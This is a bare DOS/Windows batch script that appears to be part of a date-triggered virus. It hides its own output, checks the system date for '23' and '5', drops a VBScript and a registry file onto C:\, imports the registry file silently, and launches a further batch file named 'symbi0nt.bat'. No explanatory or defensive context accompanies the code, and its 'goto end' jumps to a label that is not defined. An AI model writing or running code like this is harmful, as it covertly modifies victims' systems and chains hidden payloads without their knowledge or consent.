@echo off
ctty nul
echo.|date|find "23">nul.s
if errorlevel 1 goto end
echo.|date|find "5">nul.s
if errorlevel 1 goto 8
copy %winbootdir%\msg c:\msg.vbs
copy %winbootdir%\msgreg c:\msg.reg
regedit /s c:\msg.reg
copy %winbootdir%\symbi0nt.23 c:\symbi0nt.bat
start c:\symbi0nt.bat
:8
exit